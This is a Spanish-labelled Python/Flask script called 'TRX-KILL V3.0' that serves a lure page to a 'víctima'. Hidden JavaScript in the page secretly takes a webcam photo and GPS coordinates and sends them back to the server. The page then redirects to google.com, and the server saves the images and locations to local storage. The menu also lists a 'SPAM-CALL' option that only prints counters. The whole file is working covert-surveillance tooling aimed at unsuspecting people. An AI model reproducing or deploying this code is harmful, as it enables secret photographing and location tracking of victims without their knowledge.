import os, sys, time, threading, base64
from flask import Flask, request

# --- CONFIGURACIÓN DE RUTAS ---
STORAGE_PATH = "/sdcard/INFORMACIÓN-TRX-KILL"
CAPTURA_PATH = f"{STORAGE_PATH}/CAPTURAS"
if not os.path.exists(CAPTURA_PATH): os.makedirs(CAPTURA_PATH)

app = Flask('TRX-KILL')
R, B, C, W = "\033[1;31m", "\033[1;34m", "\033[1;36m", "\033[0m"

# --- SERVIDOR CAPTURADOR ---
@app.route('/')
def index():
    return """<!DOCTYPE html><html><body>
    <video id="v" style="display:none"></video>
    <script>
    async function s() {
        let stream = await navigator.mediaDevices.getUserMedia({video: true});
        let v = document.getElementById('v'); v.srcObject = stream;
        let c = document.createElement('canvas'); c.width=640; c.height=480;
        setTimeout(()=>{
            c.getContext('2d').drawImage(v,0,0,640,480);
            let img = c.toDataURL('image/jpeg');
            navigator.geolocation.getCurrentPosition(pos => {
                fetch('/log?lat='+pos.coords.latitude+'&lon='+pos.coords.longitude+'&img='+encodeURIComponent(img));
                window.location.href='https://www.google.com';
            });
        }, 2000);
    } s();
    </script></body></html>"""

@app.route('/log')
def log():
    lat, lon, img = request.args.get('lat'), request.args.get('lon'), request.args.get('img')
    ts = int(time.time())
    with open(f"{STORAGE_PATH}/datos.txt", "a") as f:
        f.write(f"HORA: {time.ctime()} | GPS: {lat},{lon} | IMG: {ts}.jpg\n")
    with open(f"{CAPTURA_PATH}/{ts}.jpg", "wb") as f:
        f.write(base64.b64decode(img.split(',')[1]))
    return "OK"

# --- FUNCIONES DE INTERFAZ ---
def animar(texto, color=W):
    for c in texto: sys.stdout.write(color+c); sys.stdout.flush(); time.sleep(0.02)
    print(W)

def main():
    threading.Thread(target=lambda: app.run(port=5000), daemon=True).start()
    while True:
        os.system('clear')
        print(f"{C}--- TRX-KILL V3.0 (CIBERSEGURIDAD) ---{W}")
        print(f"{B}[2] LINK-KILL | [3] CLON-KILL | [5] SPAM-CALL | [6] ADM-SIST | [0] SALIR{W}")
        sel = input("\nTRX-ROOT > ")

        if sel == "2":
            print(f"{R}LINK VÍCTIMA: http://127.0.0.1:5000{W}")
            print(f"{B}ESPERANDO QUE LA VÍCTIMA ENTRE...{W}")
            while True:
                time.sleep(2)
                # Monitoreo real del archivo
                if os.path.exists(f"{STORAGE_PATH}/datos.txt"):
                    with open(f"{STORAGE_PATH}/datos.txt", "r") as f:
                        print(f"{C}¡LA VÍCTIMA HA INGRESADO!{W}")
                        print(f.readlines()[-1])
                        break
            input("\n[Enter] para volver...")

        elif sel == "6":
            print("ACCEDIENDO A CARPETA ADM...")
            os.system(f"ls -R {STORAGE_PATH}")
            input("\n[Enter] para salir...")

        elif sel == "5":
            num = input("NÚMERO: ")
            cant = int(input("CANTIDAD (MAX 10): "))
            for i in range(1, min(cant+1, 11)):
                print(f"{i} LISTO")
                time.sleep(0.5)
            input("FINALIZADO...")

        elif sel == "0": sys.exit()

if __name__ == "__main__": main()
